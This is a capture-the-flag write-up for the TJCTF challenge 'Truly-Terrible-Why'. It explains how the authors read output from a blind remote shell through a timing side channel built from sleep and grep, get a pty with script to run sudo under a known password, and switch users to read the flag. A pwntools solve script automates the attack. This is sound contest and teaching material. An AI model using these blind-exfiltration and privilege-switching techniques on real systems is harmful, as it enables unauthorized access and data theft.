# Truly-Terrible-Why
Misc, 50

>  Written by lighthouse64
>  Your friend gave you a remote shell to his computer and challenged you to get in, but something seems a little off... The terminal you have seems almost like it isn't responding to any of the commands you put in! Figure out how to fix the problem and get into his account to find the flag!
>  
>  Note: networking has been disabled on the remote shell that you have. Also, if the problem immediately kicks you off after typing in one command, it is broken. Please let the organizers know if that happens.
>   
>  nc 52.205.246.189 9000 

We took a very zero braincell approach to this problem. We discovered that sending `exit` and then anything else would result in the connection being closed. We also noticed that sending `sleep 1 && exit` took one second longer...

Now we come up with a way to exfiltrate output. `wc -l` is a nice way to convert output to a number, and `grep` supports regular expressions that will allow us to binary search for each character of the output. We can limit `grep` to return at most one match with `-m 1`, and we can get different lines of the output by piping into `head -n $n | tail -n 1`. The resulting input looks something like:
```bash
sleep $(command | head -n 1 | tail -n 1 | grep -m 1 -P '^ *%s[\x%02x-\x%02x]' | wc -l) && exit
```
A simple `exit` takes 1 second, so if our command takes more than 2 seconds, we know that there is output. Now we can begin running commands.

There are two text files in the current working directory that contain some info. `message.txt` tells us that we want to impersonate `other_user` and `password.txt` tells us that the password for `problem_user` is `123qwer`. Running `whoami` tells us that we are `problem-user`. So, we probably need to use `sudo` to switch to `other-user`. (underscores are replaced by dashes for no reason, looking at `/etc/passwd` confirms this)

The problem is that you can't run `sudo` unless you're in a `tty`. This is quite annoying, so of course we Google the problem.

![](https://i.imgur.com/EndT0gA.png)
![](https://i.imgur.com/7yU0mS4.png)
![](https://i.imgur.com/pvfNkth.png)

Great, so we try `echo '1234qwer' | script /dev/null -c 'sudo ls'`. Unforunately our commands are now taking one second longer for some unknown reason, but that's fine; we just increase the time cutoff from 2 seconds to 3. We get our output at  rate of about 20 seconds per character: `Sorry, user problem-user is not allowed to execute '/bin/ls' as other-user on ctf-challenge.`
wtf??
We run `sudo -l` to see what we're allowed to do. The output is `(root) /usr/bin/chguser`.
wtf??
We try running `sudo chguser` and get some output: `other-user@ctf-challenge:~$`.
wtf??
So now we try running `echo whoami | sudo chguser`, just for the lulz. We get `other-user`.
wtf??
Now we run `cat /home/other-user/*` as `other-user` and see what we can find. After waiting for a bit, we get `cat: /home/other-user/flag: Is a directory`.
wtf??
Hopefully this isn't actually what the flag file contains. We try submitting `cat: /home/other-user/flag: Is a directory` as our flag and it doesn't work. Whew. So now we try `cat /home/other-user/*` and get the flag: `tjctf{ptys_sure_are_neat}`

Final solve script:
```python
from pwn import *
import time
def test(command):
	r = remote('52.205.246.189',9000)
	s = time.time()
	r.sendline('sleep $(%s) && exit'%command)
	try:
		while 1:
			r.sendline("exit")
	except EOFError:
		pass
	r.close()
	t = time.time()-s
	if t>3:
		return t
	return 0
m = ""
while 1:
	lo, hi = 31, 127
	while lo<hi:
		mid = (lo+hi)//2
		res = test(r"echo '1234qwer'|script /dev/null -c $'echo \'cat /home/other-user/flag/*\'|sudo chguser' | head -n 4 | tail -n 1 | grep -m 1 -P '^ *%s[\x%02x-\x%02x]' | wc -l"%(repr(m)[1:-1].replace("'",r"\x27").replace("(",r"\(").replace(")",r"\)"),lo,mid))
		if res:
			hi = mid
		else:
			lo = mid+1
	if lo==127 or lo==31:
		break
	m+=chr(lo)
	print(m)
```

Flag: `tjctf{ptys_sure_are_neat}`

Note: Intended solution was to use python to spawn a pty shell, then redirect to stdin to get an actual shell.